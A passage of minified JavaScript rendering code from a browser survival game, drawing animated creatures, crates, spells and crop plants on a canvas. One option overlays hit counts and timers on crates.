      this.rotate.update();
      this._alpha = e < 350 ? Math.max(0, this._alpha - I_ * 2.2) : Math.min(1, this._alpha + I_ * 2.2);
      i = (this.info & 1) == 0 ? sprite[Ie.HAWK_GROUND][s_.time] : sprite[Ie.HAWK_GROUND_ATTACK][s_.time];
      w = -i.width * this.breath.v * this.scale;
      h = -i.height * this.breath.v * this.scale;
      D.globalAlpha = 1 - this._alpha;
      Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
      i = (this.info & 1) == 0 ? sprite[Ie.HAWK][s_.time] : sprite[Ie.HAWK_ATTACK][s_.time];
      w = -i.width * this.breath.v * this.scale;
      h = -i.height * this.breath.v * this.scale;
      D.globalAlpha = this._alpha;
      Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = (0.6 - this.hit.v) * (1 - this._alpha);
        var i = sprite[Ie.HURT_HAWK_GROUND];
        w = -i.width * this.breath.v * this.scale;
        h = -i.height * this.breath.v * this.scale;
        Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
        D.globalAlpha = (0.6 - this.hit.v) * this._alpha;
        i = sprite[Ie.HURT_HAWK];
        w = -i.width * this.breath.v * this.scale;
        h = -i.height * this.breath.v * this.scale;
        Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      i = (this.info & 1) == 0 ? sprite[Ie.HAWK_WING_LEFT][s_.time] : sprite[Ie.HAWK_WING_LEFT_ATTACK][s_.time];
      w = -i.width * this.breath.v * this.scale;
      h = -i.height * this.breath.v * this.scale;
      D.save();
      D.translate(L * -20, L * 0);
      D.rotate(this.rotate.v);
      D.globalAlpha = this._alpha;
      Nn(D, i, -w * L / 4, -h * L / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        D.globalAlpha = (0.6 - this.hit.v) * this._alpha;
        i = sprite[Ie.HURT_HAWK_WING_LEFT];
        Nn(D, i, -w * L / 4, -h * L / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      D.restore();
      i = (this.info & 1) == 0 ? sprite[Ie.HAWK_WING_RIGHT][s_.time] : sprite[Ie.HAWK_WING_RIGHT_ATTACK][s_.time];
      D.save();
      D.translate(L * 20, L * 0);
      D.rotate(-this.rotate.v);
      D.globalAlpha = this._alpha;
      Nn(D, i, -w * L / 4, -h * L / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        D.globalAlpha = (0.6 - this.hit.v) * this._alpha;
        i = sprite[Ie.HURT_HAWK_WING_RIGHT];
        Nn(D, i, -w * L / 4, -h * L / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      D.globalAlpha = 1;
      D.restore();
      D.restore();
    }
    function Ia() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (Utils.dist(this, this.r) > 300) {
        this.scale = Math.min(this.scale + I_ / 2, 1.8);
      } else {
        this.scale = Math.max(this.scale - I_, 1);
      }
      this.breath.update();
      this.rotate.update();
      e = this.info === 0 ? sprite[Ie.BABY_LAVA][s_.time] : sprite[Ie.BABY_LAVA_ATTACK][s_.time];
      w = -e.width * this.breath.v * this.scale;
      h = -e.height * this.breath.v * this.scale;
      Nn(D, e, -w / 4, -h / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = 0.6 - this.hit.v;
        var e = sprite[Ie.HURT_BABY_LAVA];
        Nn(D, e, -w / 4, -h / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      e = this.info === 0 ? sprite[Ie.BABY_LAVA_WING_LEFT][s_.time] : sprite[Ie.BABY_LAVA_WING_LEFT_ATTACK][s_.time];
      w = -e.width * this.breath.v * this.scale;
      h = -e.height * this.breath.v * this.scale;
      D.save();
      D.translate(L * -40, L * 10);
      D.rotate(this.rotate.v);
      Nn(D, e, -w * L / 4, -h * L / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        D.globalAlpha = 0.6 - this.hit.v;
        e = sprite[Ie.HURT_BABY_LAVA_WING_LEFT];
        Nn(D, e, -w * L / 4, -h * L / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      D.restore();
      e = this.info === 0 ? sprite[Ie.BABY_LAVA_WING_RIGHT][s_.time] : sprite[Ie.BABY_LAVA_WING_RIGHT_ATTACK][s_.time];
      D.save();
      D.translate(L * 40, L * 10);
      D.rotate(-this.rotate.v);
      Nn(D, e, -w * L / 4, -h * L / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        D.globalAlpha = 0.6 - this.hit.v;
        e = sprite[Ie.HURT_BABY_LAVA_WING_RIGHT];
        Nn(D, e, -w * L / 4, -h * L / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      D.restore();
      D.restore();
    }
    function ua() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (Utils.dist(this, this.r) > 300) {
        this.scale = Math.min(this.scale + I_ / 2, 1.8);
      } else {
        this.scale = Math.max(this.scale - I_, 1);
      }
      this.breath.update();
      this.rotate.update();
      e = this.info === 0 ? sprite[Ie.BABY_DRAGON][s_.time] : sprite[Ie.BABY_DRAGON_ATTACK][s_.time];
      w = -e.width * this.breath.v * this.scale;
      h = -e.height * this.breath.v * this.scale;
      Nn(D, e, -w / 4, -h / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = 0.6 - this.hit.v;
        var e = sprite[Ie.HURT_BABY_DRAGON];
        Nn(D, e, -w / 4, -h / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      e = this.info === 0 ? sprite[Ie.BABY_DRAGON_WING_LEFT][s_.time] : sprite[Ie.BABY_DRAGON_WING_LEFT_ATTACK][s_.time];
      w = -e.width * this.breath.v * this.scale;
      h = -e.height * this.breath.v * this.scale;
      D.save();
      D.translate(L * -40, L * 10);
      D.rotate(this.rotate.v);
      Nn(D, e, -w * L / 4, -h * L / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        D.globalAlpha = 0.6 - this.hit.v;
        e = sprite[Ie.HURT_BABY_DRAGON_WING_LEFT];
        Nn(D, e, -w * L / 4, -h * L / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      D.restore();
      e = this.info === 0 ? sprite[Ie.BABY_DRAGON_WING_RIGHT][s_.time] : sprite[Ie.BABY_DRAGON_WING_RIGHT_ATTACK][s_.time];
      D.save();
      D.translate(L * 40, L * 10);
      D.rotate(-this.rotate.v);
      Nn(D, e, -w * L / 4, -h * L / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        D.globalAlpha = 0.6 - this.hit.v;
        e = sprite[Ie.HURT_BABY_DRAGON_WING_RIGHT];
        Nn(D, e, -w * L / 4, -h * L / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      D.restore();
      D.restore();
    }
    function la() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (Utils.dist(this, this.r) > 300) {
        this.scale = Math.min(this.scale + I_ / 2, 1.8);
      } else {
        this.scale = Math.max(this.scale - I_, 1);
      }
      this.breath.update();
      this.rotate.update();
      e = sprite[Ie.LAVA_DRAGON][s_.time];
      w = -e.width * this.breath.v * this.scale;
      h = -e.height * this.breath.v * this.scale;
      Nn(D, e, -w / 4, -h / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = 0.6 - this.hit.v;
        var e = sprite[Ie.HURT_LAVA_DRAGON];
        Nn(D, e, -w / 4, -h / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      e = sprite[Ie.LAVA_WING_LEFT][s_.time];
      w = -e.width * this.breath.v * this.scale;
      h = -e.height * this.breath.v * this.scale;
      D.save();
      D.translate(L * -60, L * 20);
      D.rotate(this.rotate.v);
      Nn(D, e, -w * L / 4, -h * L / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        D.globalAlpha = 0.6 - this.hit.v;
        e = sprite[Ie.HURT_LAVA_WING_LEFT];
        Nn(D, e, -w * L / 4, -h * L / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      D.restore();
      e = sprite[Ie.LAVA_WING_RIGHT][s_.time];
      D.save();
      D.translate(L * 60, L * 20);
      D.rotate(-this.rotate.v);
      Nn(D, e, -w * L / 4, -h * L / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        D.globalAlpha = 0.6 - this.hit.v;
        e = sprite[Ie.HURT_LAVA_WING_RIGHT];
        Nn(D, e, -w * L / 4, -h * L / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      D.restore();
      D.restore();
    }
    function Oa() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (Utils.dist(this, this.r) > 300) {
        this.scale = Math.min(this.scale + I_ / 2, 1.8);
      } else {
        this.scale = Math.max(this.scale - I_, 1);
      }
      this.breath.update();
      this.rotate.update();
      e = sprite[Ie.DRAGON][s_.time];
      w = -e.width * this.breath.v * this.scale;
      h = -e.height * this.breath.v * this.scale;
      Nn(D, e, -w / 2, -h / 2, w, h);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = 0.6 - this.hit.v;
        var e = sprite[Ie.HURT_DRAGON];
        Nn(D, e, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      e = sprite[Ie.WING_LEFT][s_.time];
      w = -e.width * this.breath.v * this.scale;
      h = -e.height * this.breath.v * this.scale;
      D.save();
      D.translate(L * -30, L * 70);
      D.rotate(this.rotate.v);
      Nn(D, e, L * -10, L * -40, w, h);
      if (this.action & Es.HURT) {
        D.globalAlpha = 0.6 - this.hit.v;
        e = sprite[Ie.HURT_WING_LEFT];
        Nn(D, e, L * -10, L * -40, w, h);
        D.globalAlpha = 1;
      }
      D.restore();
      e = sprite[Ie.WING_RIGHT][s_.time];
      D.save();
      D.translate(L * 30, L * 70);
      D.rotate(-this.rotate.v);
      Nn(D, e, L * 10 - w, L * -40, w, h);
      if (this.action & Es.HURT) {
        D.globalAlpha = 0.6 - this.hit.v;
        e = sprite[Ie.HURT_WING_RIGHT];
        Nn(D, e, L * 10 - w, L * -40, w, h);
        D.globalAlpha = 1;
      }
      D.restore();
      D.restore();
    }
    function ca(e, i) {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (e === Ie.GIFT) {
        e = Ie.CRATE;
        this.info = 36;
      }
      img = sprite[e][this.info][s_.time];
      w = -img.width / 2;
      h = -img.height / 2;
      Nn(D, img, -w / 2, -h / 2, w, h);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = 0.6 - this.hit.v;
        var n = To(this.info, img, __EFFECT_BOX__);
        Nn(D, n, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      if (r.visuals.info.box) {
        t.createText(this.hited + " HIT", "white", 0, 25, 18, -this.angle);
        t.createText(this.type === 82 ? "Dead" : "Drop", "white", 0, -15, 18, -this.angle);
        t.createText(this.type === 82 ? ((this.info >= 49 && this.info <= 57 ? 30 : 240) - (Date.now() - this.time) / 1000).toFixed(1) + "s" : (16.2 - (Date.now() - this.time) / 1000).toFixed(1) + "s", "white", 0, 45, 18, -this.angle);
      }
      D.restore();
    }
    function Ra(e, i) {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      t = sprite[e][s_.time];
      w = -t.width;
      h = -t.height;
      Nn(D, t, -w / 2, -h / 2, w, h);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = 0.6 - this.hit.v;
        var t = sprite[i];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      D.restore();
    }
    function Ca() {
      this.breath.update();
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      e = this.info === 0 ? sprite[Ie.BABY_MAMMOTH][s_.time] : sprite[Ie.BABY_MAMMOTH_ATTACK][s_.time];
      w = -e.width * this.breath.v;
      h = -e.height * this.breath.v;
      Nn(D, e, -w / 2, -h / 2, w, h);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = 0.6 - this.hit.v;
        var e = sprite[Ie.HURT_BABY_MAMMOTH];
        Nn(D, e, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      D.restore();
    }
    function Na() {
      this.breath.update();
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      e = this.info === 0 ? sprite[Ie.BOAR][s_.time] : sprite[Ie.BOAR_ATTACK][s_.time];
      w = -e.width * this.breath.v;
      h = -e.height * this.breath.v;
      Nn(D, e, -w / 2, -h / 2, w, h);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = 0.6 - this.hit.v;
        var e = sprite[Ie.HURT_BOAR];
        Nn(D, e, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      D.restore();
    }
    function ba() {
      var e = Math.PI / 2;
      var i = Math.PI / 4;
      this.breath.update();
      this.breathl.update();
      this.breathr.update();
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      t = this.info === 0 ? sprite[Ie.CRAB_BOSS][s_.time] : sprite[Ie.CRAB_BOSS_ATTACK][s_.time];
      w = -t.width * this.breath.v;
      h = -t.height * this.breath.v;
      Nn(D, t, -w / 2, -h / 2, w, h);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = 0.6 - this.hit.v;
        var t = sprite[Ie.HURT_CRAB_BOSS];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      if (this.action & Es.COLD) {
        if (this.heal.update() && this.heal.o == 0) {
          this.action -= Es.COLD;
        }
        D.globalAlpha = 0.6 - this.heal.v;
        t = sprite[Ie.HEAL_CRAB_BOSS];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      D.restore();
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle + i);
      D.translate(100, 0);
      D.rotate(e);
      t = this.info === 0 ? sprite[Ie.CRAB_BOSS_CLAW_LEFT][s_.time] : sprite[Ie.CRAB_BOSS_CLAW_LEFT_ATTACK][s_.time];
      w = -t.width * this.breathl.v;
      h = -t.height * this.breathl.v;
      Nn(D, t, -w / 2, -h / 2, w, h);
      if (this.action & Es.HURT) {
        D.globalAlpha = 0.6 - this.hit.v;
        t = sprite[Ie.HURT_CRAB_BOSS_CLAW_LEFT];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      if (this.action & Es.COLD) {
        D.globalAlpha = 0.6 - this.heal.v;
        t = sprite[Ie.HEAL_CRAB_BOSS_CLAW_LEFT];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      D.restore();
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle + e + i);
      D.translate(100, 0);
      D.rotate(e);
      t = this.info === 0 ? sprite[Ie.CRAB_BOSS_CLAW_RIGHT][s_.time] : sprite[Ie.CRAB_BOSS_CLAW_RIGHT_ATTACK][s_.time];
      w = -t.width * this.breathr.v;
      h = -t.height * this.breathr.v;
      Nn(D, t, -w / 2, -h / 2, w, h);
      if (this.action & Es.HURT) {
        D.globalAlpha = 0.6 - this.hit.v;
        t = sprite[Ie.HURT_CRAB_BOSS_CLAW_RIGHT];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      if (this.action & Es.COLD) {
        D.globalAlpha = 0.6 - this.heal.v;
        t = sprite[Ie.HEAL_CRAB_BOSS_CLAW_RIGHT];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      D.restore();
    }
    function Da() {
      var e = Math.PI / 2;
      var i = Math.PI / 4;
      this.breath.update();
      this.breathl.update();
      this.breathr.update();
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      t = this.info === 0 ? sprite[Ie.CRAB][s_.time] : sprite[Ie.CRAB_ATTACK][s_.time];
      w = -t.width * this.breath.v;
      h = -t.height * this.breath.v;
      Nn(D, t, -w / 2, -h / 2, w, h);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = 0.6 - this.hit.v;
        var t = sprite[Ie.HURT_CRAB];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      if (this.action & Es.COLD) {
        if (this.heal.update() && this.heal.o == 0) {
          this.action -= Es.COLD;
        }
        D.globalAlpha = 0.6 - this.heal.v;
        t = sprite[Ie.HEAL_CRAB];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      D.restore();
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle + i);
      D.translate(55, 0);
      D.rotate(e);
      t = this.info === 0 ? sprite[Ie.CRAB_CLAW_LEFT][s_.time] : sprite[Ie.CRAB_CLAW_LEFT_ATTACK][s_.time];
      w = -t.width * this.breathl.v;
      h = -t.height * this.breathl.v;
      Nn(D, t, -w / 2, -h / 2, w, h);
      if (this.action & Es.HURT) {
        D.globalAlpha = 0.6 - this.hit.v;
        t = sprite[Ie.HURT_CRAB_CLAW_LEFT];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      if (this.action & Es.COLD) {
        D.globalAlpha = 0.6 - this.heal.v;
        t = sprite[Ie.HEAL_CRAB_CLAW_LEFT];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      D.restore();
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle + e + i);
      D.translate(55, 0);
      D.rotate(e);
      t = this.info === 0 ? sprite[Ie.CRAB_CLAW_RIGHT][s_.time] : sprite[Ie.CRAB_CLAW_RIGHT_ATTACK][s_.time];
      w = -t.width * this.breathr.v;
      h = -t.height * this.breathr.v;
      Nn(D, t, -w / 2, -h / 2, w, h);
      if (this.action & Es.HURT) {
        D.globalAlpha = 0.6 - this.hit.v;
        t = sprite[Ie.HURT_CRAB_CLAW_RIGHT];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      if (this.action & Es.COLD) {
        D.globalAlpha = 0.6 - this.heal.v;
        t = sprite[Ie.HEAL_CRAB_CLAW_RIGHT];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      D.restore();
    }
    function Sa() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      this.born = Math.min(1, this.born + I_ * 2);
      D.globalAlpha = Math.min(1, Math.max(0, Utils.dist(this, this.r) / 80)) * this.born;
      this.breath.update();
      img = sprite[Ie.SPELL][s_.time][this.spell];
      if (this.spell < 2) {
        w = -img.width * this.breath.v;
        h = -img.height * this.breath.v;
      } else if (this.fly === 0) {
        w = -img.width;
        h = -img.height;
      } else {
        w = -img.width * 1.35;
        h = -img.height * 1.35;
      }
      Nn(D, img, -w / 2, -h / 2, w, h);
      D.globalAlpha = 1;
      D.restore();
    }
    function pa(e, i) {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      this.breath.update();
      t = sprite[e][s_.time];
      w = -t.width * this.breath.v;
      h = -t.height * this.breath.v;
      Nn(D, t, -w / 2, -h / 2, w, h);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = 0.6 - this.hit.v;
        var t = sprite[i];
        Nn(D, t, -w / 2, -h / 2, w, h);
        D.globalAlpha = 1;
      }
      D.restore();
    }
    function ma(e, i) {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      this.breath.update();
      t = sprite[e][s_.time];
      w = -t.width * this.breath.v;
      h = -t.height * this.breath.v;
      Nn(D, t, -w / 4, -h / 4, w / 2, h / 2);
      if (this.action & Es.HURT) {
        if (this.hit.update() && this.hit.o == 0) {
          this.action -= Es.HURT;
        }
        D.globalAlpha = 0.6 - this.hit.v;
        var t = sprite[i];
        Nn(D, t, -w / 4, -h / 4, w / 2, h / 2);
        D.globalAlpha = 1;
      }
      D.restore();
    }
    function va(e, i, t) {
      D.save();
      D.translate(__.cam.x + i, __.cam.y + t);
      D.rotate(this.angle);
      D.translate(this.x - i, this.y - t);
      this.breath.update();
      img = sprite[e][s_.time];
      w = -img.width * this.breath.v;
      h = -img.height * this.breath.v;
      Nn(D, img, -w / 2, -h / 2, w, h);
      D.restore();
    }
    function Ma(e) {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      this.breath.update();
      img = sprite[e][s_.time];
      w = -img.width * this.breath.v;
      h = -img.height * this.breath.v;
      Nn(D, img, -w / 2, -h / 2, w, h);
      D.restore();
    }
    function La() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      var r = this.info & 15;
      if (this.info === 10 || r === 0) {
        D.rotate(this.angle);
        this.ground.update();
        if (this.info & 16) {
          var n = sprite[Ie.PLANT_THORNBUSH_DRIED][s_.time];
        } else {
          n = sprite[Ie.PLANT_THORNBUSH][s_.time];
        }
        var a = -n.width * this.ground.v;
        var o = -n.height * this.ground.v;
        Nn(D, n, -a / 2 + i, -o / 2 + t, a, o);
      } else {
        if (this.info & 16) {
          n = sprite[Ie.DRIED_THORNBUSH][s_.time];
        } else {
          n = sprite[Ie.THORNBUSH][s_.time];
        }
        D.translate(0, n.height / 2);
        Nn(D, n, i - n.width / 2, -n.height + t);
      }
      D.restore();
    }
    function Ga() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      var r = this.info & 15;
      if (this.info === 10 || r === 0) {
        D.rotate(this.angle);
        this.ground.update();
        if (this.info & 16) {
          var n = sprite[Ie.PLANT_GARLIC_DRIED][s_.time];
        } else {
          n = sprite[Ie.PLANT_GARLIC][s_.time];
        }
        var a = -n.width * this.ground.v;
        var o = -n.height * this.ground.v;
        Nn(D, n, -a / 2 + i, -o / 2 + t, a, o);
      } else {
        if (this.info & 16) {
          n = sprite[Ie.DRIED_GARLIC][s_.time];
        } else {
          n = sprite[Ie.GARLIC][s_.time];
        }
        D.translate(0, n.height / 2);
        Nn(D, n, i - n.width / 2, -n.height + t);
      }
      D.restore();
    }
    function fa() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      var r = this.info & 15;
      if (this.info === 10 || r === 0) {
        D.rotate(this.angle);
        this.ground.update();
        if (this.info & 16) {
          var n = sprite[Ie.PLANT_ALOE_VERA_DRIED][s_.time];
        } else {
          n = sprite[Ie.PLANT_ALOE_VERA][s_.time];
        }
        var a = -n.width * this.ground.v;
        var o = -n.height * this.ground.v;
        Nn(D, n, -a / 2 + i, -o / 2 + t, a, o);
      } else {
        if (this.info & 16) {
          n = sprite[Ie.DRIED_ALOE_VERA][s_.time];
        } else {
          n = sprite[Ie.ALOE_VERA_GROWN][s_.time];
        }
        D.translate(0, n.height / 2);
        Nn(D, n, i - n.width / 2, -n.height + t);
      }
      D.restore();
    }
    function Ha() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      var r = this.info & 15;
      if (this.info === 10 || r === 0) {
        D.rotate(this.angle);
        this.ground.update();
        if (this.info & 16) {
          var n = sprite[Ie.PLANT_WATERMELON_DRIED][s_.time];
        } else {
          n = sprite[Ie.PLANT_WATERMELON][s_.time];
        }
        var a = -n.width * this.ground.v;
        var o = -n.height * this.ground.v;
        Nn(D, n, -a / 2 + i, -o / 2 + t, a, o);
      } else {
        if (this.info & 16) {
          n = sprite[Ie.DRIED_WATERMELON][s_.time];
        } else {
          n = sprite[Ie.WATERMELON][s_.time];
        }
        D.translate(0, n.height / 2);
        Nn(D, n, i - n.width / 2, -n.height + t);
      }
      D.restore();
    }
    function Pa() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      var r = this.info & 15;
      if (this.info === 10 || r === 0) {
        D.rotate(this.angle);
        this.ground.update();
        if (this.info & 16) {
          var n = sprite[Ie.PLANT_CARROT_DRIED][s_.time];
        } else {
          n = sprite[Ie.PLANT_CARROT][s_.time];
        }
        var a = -n.width * this.ground.v;
        var o = -n.height * this.ground.v;
        Nn(D, n, -a / 2 + i, -o / 2 + t, a, o);
      } else {
        if (this.info & 16) {
          n = sprite[Ie.DRIED_CARROT][s_.time];
        } else {
          n = sprite[Ie.CARROT][s_.time];
        }
        D.translate(0, n.height / 2);
        Nn(D, n, i - n.width / 2, -n.height + t);
      }
      D.restore();
    }
    function ya() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      var r = this.info & 15;
      if (this.info === 10 || r === 0) {
        D.rotate(this.angle);
        this.ground.update();
        if (this.info & 16) {
          var n = sprite[Ie.PLANT_PUMPKIN_DRIED][s_.time];
        } else {
          n = sprite[Ie.PLANT_PUMPKIN][s_.time];
        }
        var a = -n.width * this.ground.v;
        var o = -n.height * this.ground.v;
        Nn(D, n, -a / 2 + i, -o / 2 + t, a, o);
      } else {
        if (this.info & 16) {
          n = sprite[Ie.DRIED_PUMPKIN][s_.time];
        } else {
          n = sprite[Ie.PUMPKIN][s_.time];
        }
        D.translate(0, n.height / 2);
        Nn(D, n, i - n.width / 2, -n.height + t);
      }
      D.restore();
    }
    function Ba() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      var r = this.info & 15;
      if (this.info === 10 || r === 0) {
        D.rotate(this.angle);
        this.ground.update();
        if (this.info & 16) {
          var n = sprite[Ie.WHEAT_SEED_DRIED][s_.time];
        } else {
          n = sprite[Ie.WHEAT_SEED][s_.time];
        }
        var a = -n.width * this.ground.v;
        var o = -n.height * this.ground.v;
        Nn(D, n, -a / 2 + i, -o / 2 + t, a, o);
      } else {
        this.wind.update();
        if (this.info & 16) {
          n = sprite[Ie.DRIED_WHEAT][s_.time];
        } else {
          n = sprite[Ie.WILD_WHEAT][s_.time];
        }
        D.translate(0, n.height / 2);
        D.rotate(this.wind.v);
        Nn(D, n, i - n.width / 2, -n.height + t);
      }
      D.restore();
    }
    function za() {
      if (!(this.info < 10)) {
        D.save();
        D.translate(__.cam.x + this.x, __.cam.y + this.y);
        D.rotate(this.angle);
        if (this.hit.update) {
          if (this.hit.anim.update() && this.hit.anim.o == 0) {
            this.hit.update = false;
          }
          var e = (1 - this.hit.anim.v) * I_ * 600 * L;
          var i = Math.cos(this.hit.angle - this.angle) * e;
